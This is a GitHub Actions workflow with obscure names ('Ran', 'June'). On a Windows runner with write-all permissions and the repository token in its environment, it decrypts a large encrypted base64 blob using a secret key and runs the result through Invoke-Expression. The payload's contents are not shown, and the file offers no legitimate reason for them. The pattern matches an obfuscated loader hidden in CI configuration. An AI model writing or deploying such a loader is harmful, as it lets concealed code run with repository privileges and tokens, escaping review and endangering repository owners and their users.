name: Ran

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "U2FsdGVkX181NAnPpHnnNNrOU1DS/8zSQ8hD2m9xI3qVo+nja6pQRvc7gGAfrPMC7m4dS62cnbUAK6PxCr0IlHapACEj2KqqMDcktSCUI8PL0f0nRRUStiUrm3v7+/o3bwH/TyqCOnptMXQlvl4uOpvuuI/RIg1tr/irA1UIN58u5u1Ig6A2oZ4Hl+s062J21KiajiuMZO12nh/c/g3YZ8JB9a6devyB0NVY5bTFVxuR6dMGZwVgaHE+fWPN1q2cDrh/geFPqoaeZBrST4bNG0STbSaYGDFWXl+Eiegs0NwZpBpGKvlDJ3BFUjR6q6zrOGNzpdqnIG59NYTow4IO5BZ3yzfO3fKo8gVnJFuvFVwFC+tGdzeZB3OTbOsK+UFPSQtenKfvOrPVIZbTnXivdDp72A40SIuG/AnHo02CEAAwUmAXn/A1Mbu6X4LiqV0jOTflrVAeoz2yPv1pk1NPvEd8MyTP3X0CCkmMfJB8GoHgsyegQytc33aBzs7WrHzbgT5eiAUGmjr8XVpDOJkuBFWDcln+GK2cFE9YqwA9dM3QMnEorV6gBJ+pOKqpLiQ2O8j97gP8adocWr1rxTlu2o1UIiR05R1mRw33dOmzc+c2+sm926ke4mnVFfgShONaOaet2RT+6/4bjm88l9SJrkSgiOTdlQyIgU/S/WlPlAx/FDwO1no6jMoNxVemdeMXUpPv4o623tS7HVrXiZ0Bb8Jbl4nj3UgqpMPGbZqpVx1XAyVnH8AYu+r1H1nT2mtB0ZXKz/VFtHuCwRY1DDV7EYRaYTBbNp0ncC/NtGDPATHPc2EAJ6Z7GkvGz/HzAPpYRDnUeWM/LhmTFYYWz4aLP4C+b40KzXL93I5ovWFq0eYIEESAwNhHIjStlyP28xXXk+FL+ypQiapxbx+Hu9hwh+xizLAfUmBb1opP+5+QFHY1npPhwiJfIC2A8xVGYLenD9wZGYi6SyMxr6rIIowb6oMZFgDpYWa+m0lE58pdPR5FvOhIDW//eOHaihnoQ8wEVcinnapzVp8qT37/bghIUAK/JYWV+/DrfxqSV3oEva9IzYwoyi4VxxE4ygrB57fo5Gf9fuyE9W5J7begNu6QbM4f+3gMs4JbCyhA8eFrl43gL92sWhtQwsB/zbmwoJNOp0cM8CCiLnn5ZBiRSVmFLWKjAWqlV1athX2veGtvKYZSs/Rce2wSHThHz62qIfwleKpNYnp1ivReDopJaPtT92TCzny9pM7LpweSdL1QkuolfZKhK66YWZBR+sFa9/O9Ld41+3NXjzlRlxCvdsgnAxpijkbdaEIYqBvbhg4lRmn329Mznims3Ib5zlifcDz2bXmX+4S+zpxMybDvat9rYB+bO1ARlYILhBFv/R2aENKAFvjhWZha66+rHv1mXqhayPH/P3CA5Wz8+FMXe9smVlpM59FbCpXrwyKAzy4y2nfKGGEQBttxhAgU4+XxMogSpAoRf+AtBLvOpio+KGBCVvVO71JQIRUKSH2saVXDEl//W8DJy54n8Eq7A0fV9loYHPV7/JwXsEgmfR3672W0HwKdNpyPitg9IQgZusbM6oL1QYcPls2rosnX1qeNDRvs"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
